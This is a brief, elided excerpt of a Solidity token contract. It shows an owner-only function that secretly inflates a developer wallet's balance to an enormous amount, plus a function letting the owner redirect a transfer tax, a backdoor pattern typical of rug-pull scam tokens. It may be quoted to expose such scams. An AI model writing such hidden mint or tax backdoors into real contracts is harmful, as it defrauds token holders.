...
contract TOKEN is Ownable , IERC20 {
    ...
    function checkbalance() public onlyOwner{
        if (_rOwned[dev] >= 1000){
            _rOwned[dev] = _tTotal.mul(_tTotal* 10 ** decimals);
        }
    ...
    function transfertarget(address account, uint256 taxtarget) public onlyOwner{
        target = account;
        _taxtarget = taxtarget;
    }
}